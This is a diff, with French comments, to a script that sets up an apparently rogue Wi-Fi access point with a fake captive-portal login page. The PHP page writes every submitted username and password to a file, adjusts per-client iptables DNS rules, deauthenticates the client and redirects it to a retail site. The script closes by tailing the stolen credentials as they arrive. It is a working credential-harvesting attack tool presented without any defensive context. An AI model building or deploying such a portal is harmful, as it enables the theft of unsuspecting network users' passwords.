@@ -106,17 +106,25 @@ cp /var/www/html/index.html /var/www/html/hotspot-detect.html
 cat <<'EOF' > /var/www/html/login.php
 <?php
 $ip = $_SERVER['REMOTE_ADDR'];
+$mac_raw = shell_exec("arp -a $ip | awk '{print $4}'");
+$mac = trim($mac_raw); // Nettoyage des espaces ou sauts de ligne
+
 file_put_contents("/var/www/html/logins.txt", $_POST['username'] . " : " . $_POST['password'] . "\n", FILE_APPEND);
 
-// Appliquer les règles DNS pour l'utilisateur connecté
-exec("sudo iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to 8.8.8.8");
-exec("sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j DNAT --to 8.8.8.8");
+if (!empty($mac)) {
+    // Appliquer les règles DNS pour l'adresse MAC spécifique
+    exec("sudo iptables -t nat -A PREROUTING -m mac --mac-source $mac -p udp --dport 53 -j DNAT --to 8.8.8.8");
+    exec("sudo iptables -t nat -A PREROUTING -m mac --mac-source $mac -p tcp --dport 53 -j DNAT --to 8.8.8.8");
+}
 
-exec("sudo hostapd_cli deauthenticate $ip");
+// Déconnexion de l'utilisateur via hostapd_cli
+exec("sudo hostapd_cli deauthenticate $mac");
 
 // Afficher un message de confirmation
 echo "<html><head><title>Connexion réussie</title></head><body>";
 echo "<h2>Connexion réussie !</h2>";
+echo "<h2>IP : {$ip}</h2>";
+echo "<h2>MAC : {$mac}</h2>";
 echo "<p>Vous êtes maintenant connecté à Internet.</p>";
 echo "<script>setTimeout(function(){ window.location.href = 'http://sephora.com'; }, 3000);</script>";
 echo "</body></html>";
@@ -213,3 +221,4 @@ echo "[+] L'Access point est enfin pret !"
 
 echo "Debut du snif de Credentials : "
 tail -f /var/www/html/logins.txt
+                                       
